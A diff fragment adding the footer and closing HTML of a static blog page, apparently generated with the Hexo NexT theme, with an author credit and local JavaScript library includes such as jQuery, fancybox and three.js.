+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">狗蛋菌</span>
+
+  
+</div>
+
+
+
+
+
+ 
+
+
+
+ 
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/three.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/three-waves.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
